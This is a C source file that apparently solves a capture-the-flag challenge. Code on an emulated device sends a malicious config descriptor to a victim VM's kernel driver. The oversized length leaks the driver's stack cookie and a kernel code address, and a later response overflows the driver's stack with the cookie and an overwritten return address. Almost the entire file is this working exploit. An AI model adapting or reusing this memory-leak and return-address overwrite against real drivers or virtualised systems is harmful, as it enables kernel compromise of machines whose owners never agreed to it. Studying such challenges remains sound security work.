// Copyright 2021 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include "device.h"

void fake_respond(volatile unsigned char *base_addr, char status);

#define MAX_PACKAGE_LENGTH 0x100
#define MAX_ENTRY_LENGTH (MAX_PACKAGE_LENGTH - 4)

#define WAIT_FOR_CMD(base)                                     \
  do {                                                         \
    while (((*(volatile unsigned char *)(base)) & 128) == 0) { \
    };                                                         \
  } while (0)

__attribute((naked)) int write(int fd, const void *p, int n) {
  __asm__("li a7, 16; ecall; ret;");
}

void fake_respond(volatile unsigned char *base_addr, char status) {
  // base_addr = (unsigned char *)0x13370000;
  // status
  *(base_addr + 1) = status;  // STATUS_OK
  // control
  *base_addr &= ~CMD_EXECUTE;
  // IRQ
  *(base_addr + 0xFFF) = 1;
}

#if 0
void leak_flag1() {
  unsigned char *base_addr = (unsigned char *)(0x13370000);

  for (int i = 0; i < 252; i++) *(base_addr + 4 + i) = '\x00';

  int n_bytes = 0;
  unsigned char *outp = base_addr + 4;
  for (char *p = (char *)0x8000; p < (char *)0x10000; p++) {
    if (*p) {
      *outp++ = *p;
      n_bytes++;
    }
    if (n_bytes > 0x280) break;
  }
  if (n_bytes > 10)
    write(1, "+\n", 2);
  else
    write(1, "-\n", 2);

  // len
  *((unsigned short *)(base_addr + 2)) = n_bytes;
  WAIT_FOR_CMD(base_addr);
  fake_respond(base_addr);
}
#endif

void print_nibble(unsigned char c) {
  char b;
  if (c >= 0 && c <= 9)
    b = '0' + c;
  else
    b = 'a' + (c - 0xA);
  write(1, &b, 1);
}
void print_hex(unsigned char c) {
  print_nibble(c >> 4);
  print_nibble(c & 0xF);
}

void *memcpy(volatile unsigned char *d, const volatile unsigned char *s,
             int i) {
  while (i--) *d++ = *s++;
}

unsigned long swap(unsigned long a) {
  unsigned long res = 0;
  char *pa = (char *)&a;
  char *pb = (char *)&res;
  for (int i = 0; i < 8; i++) pb[i] = pa[7 - i];
  return res;
}

unsigned long leak_flag2(unsigned long *rip_target) {
  char dbg[16];
  dbg[2] = '\n';
  // Leak some memory from the victim VM.
  volatile unsigned char *base_addr = (unsigned char *)(0x13370000);
  volatile unsigned char *victim_base = (unsigned char *)(0x13371000);

  write(1, "ATTK\n", 5);
  WAIT_FOR_CMD(base_addr);
  for (int i = 4; i < 0x100; i++) base_addr[i] = victim_base[i - 4];
  fake_respond(base_addr, STATUS_OK);
  // Chances are that it needs a response already.
  // fake_respond(victim_base);
  // Send 'INIT_REQUIRED' state
  for (;;) {
    write(1, "WAIT\n", 5);
    while ((*victim_base & CMD_EXECUTE) != CMD_EXECUTE) {
      // Copy over victim data to vulnbox if requested
      if ((*base_addr & CMD_EXECUTE) == CMD_EXECUTE) {
        for (int i = 4; i < 0x100; i++) base_addr[i] = victim_base[i - 4];
        fake_respond(base_addr, STATUS_OK);
      }
    }
    if (*victim_base != (CMD_EXECUTE | CMD_GET_DEVICE_CONFIG)) {
      unsigned char cmd = *victim_base;
      write(1, ":(\n", 3);
      dbg[0] = (*victim_base >> 4) + '0';
      dbg[1] = (*victim_base & 0x0F) + '0';
      write(1, dbg, 3);
      fake_respond(victim_base, STATUS_OK);

      if (cmd == (CMD_EXECUTE | CMD_GET_VAL)) {
        for (volatile int i = 0; i < 10000; i++)
          ;
        *(victim_base + 1) = STATUS_REQ_INIT;
      }
      continue;
    }
    break;
  }

#define LEAK_AMOUNT 0xFF

  // Send over device descriptor.
  const static struct DeviceConfigDescriptor DeviceConfig = {
      .device_config_descriptor_length = sizeof(struct DeviceConfigDescriptor),
      .config_version = CONFIG_VERSION,
      .device_version = CONFIG_VERSION,
      .host_config_descriptor_length = LEAK_AMOUNT,
      .max_packet_size = 0x100};
  memcpy(victim_base + 4, (const unsigned char *)&DeviceConfig,
         sizeof(struct DeviceConfigDescriptor));
  *((unsigned short *)(victim_base + 2)) =
      sizeof(struct DeviceConfigDescriptor);
  write(1, "SEND\n", 5);
  fake_respond(victim_base, STATUS_OK);
  *victim_base &= ~CMD_EXECUTE;

  write(1, "WAIT2\n", 6);
  char buf[LEAK_AMOUNT];
  while ((*victim_base & CMD_EXECUTE) != CMD_EXECUTE) {
    if ((*base_addr & CMD_EXECUTE) == CMD_EXECUTE) {
      for (int i = 4; i < 0x100; i++) base_addr[i] = victim_base[i - 4];
      fake_respond(base_addr, STATUS_OK);
    }
  }
  for (int i = 0; i < LEAK_AMOUNT; i++) buf[i] = victim_base[4 + i];
  unsigned short leak_len = *(volatile unsigned short *)(victim_base + 2);
  fake_respond(victim_base, STATUS_OK);
  // WAIT_FOR_CMD(victim_base);
  write(1, "RDY\n", 4);

  // u64 @ offset 78 (0x4E) contains  device_select_entry.cold.0 + 8
  // ffffffffc01f7db5 t device_select_entry.cold.0	[main]
  // 0x9A should have cdev_ioctl + 0x12F
  unsigned long device_select_entry_cold0 =
      *(unsigned long *)(buf + 0x4A) - 0x8;         // - 0x8; // actually 4B now
  *rip_target = device_select_entry_cold0 - 0x308;  // TODO, -8 additional.
  // -> calculate entry points to `device_write_entry` + priv->encryption_key

  // Stack cookie:
  unsigned long stack_cookie = *(unsigned long *)(buf + 0x32);

  // Prepare buffer for override so we won't fail later.
  volatile unsigned long *pl =
      (volatile unsigned long *)(victim_base + 4 + 256);
  *pl = stack_cookie;
  write(1, "cook:", 5);
  for (int i = 0; i < 8; i++) {
    print_hex((unsigned char)(stack_cookie >> (8 * i)));
    write(1, " ", 1);
  }
  write(1, "\n", 1);
  write(1, "leak:", 5);
  for (int i = 0; i < 8; i++) {
    print_hex((unsigned char)((device_select_entry_cold0) >> (8 * i)));
    write(1, " ", 1);
  }
  write(1, "\n", 1);
  write(1, "trgt:", 5);
  for (int i = 0; i < 8; i++) {
    print_hex((unsigned char)((*rip_target) >> (8 * i)));
    write(1, " ", 1);
  }
  write(1, "\n", 1);

  WAIT_FOR_CMD(base_addr);
  write(1, "here\n", 5);
  if ((*base_addr & CMD_EXECUTE) == CMD_EXECUTE) {
    for (int i = 0x000; i < LEAK_AMOUNT; i++) base_addr[4 + i] = buf[i];
    *((unsigned short *)(base_addr + 2)) = leak_len;
    fake_respond(base_addr, STATUS_OK);
  }

  return stack_cookie;
}

int main() {
  write(1, "Hi2\n", 4);
  // leak_flag1();
  unsigned long target_rip = 0;
  unsigned long cookie = leak_flag2(&target_rip);
  write(1, "Loop\n", 5);
  while (1) {
    volatile unsigned char *base_addr = (unsigned char *)(0x13370000);
    volatile unsigned char *victim_base = (unsigned char *)(0x13371000);
    // guest wants a response
    if ((*base_addr & CMD_EXECUTE) == CMD_EXECUTE) {
      for (int i = 4; i < 0x100; i++) base_addr[i] = victim_base[i - 4];
      fake_respond(base_addr, STATUS_OK);
    }

    // victim wants a response
    if ((*victim_base & CMD_EXECUTE) == CMD_EXECUTE) {
      // It is get-val
      if ((*victim_base & CMD_GET_VAL) == CMD_GET_VAL) {
        // Vulnerable, trigger overflow
        *((unsigned short *)(victim_base + 2)) =
            256 + 8 /* stack cookie */ + 5 * 8;
        *((unsigned long *)(victim_base + 4 + 256)) = cookie;
        *((unsigned long *)(victim_base + 4 + 256 + 8)) =
            0x4141414141414141;  // rbx
        *((unsigned long *)(victim_base + 4 + 256 + 16)) =
            0x4242424242424242;  // rbp
        *((unsigned long *)(victim_base + 4 + 256 + 24)) =
            0x4343434343434343;  // r12
        *((unsigned long *)(victim_base + 4 + 256 + 32)) =
            0x4444444444444444;                                         // r13
        *((unsigned long *)(victim_base + 4 + 256 + 40)) = target_rip;  // rip

        fake_respond(victim_base, STATUS_OK);
        // Now we will get another cmd.
        write(1, "WT\n", 3);
        while ((*victim_base & CMD_EXECUTE) != CMD_EXECUTE)
          ;
        // Responding here will cause an oopsie.
        write(1, "BOOM\n", 5);
        while (1) {
          if ((*base_addr & CMD_EXECUTE) == CMD_EXECUTE) {
            for (int i = 4; i < 0x100; i++) base_addr[i] = victim_base[i - 4];
            fake_respond(base_addr, STATUS_OK);
          }
        }
      } else
        fake_respond(victim_base, STATUS_OK);
    }
  }
}
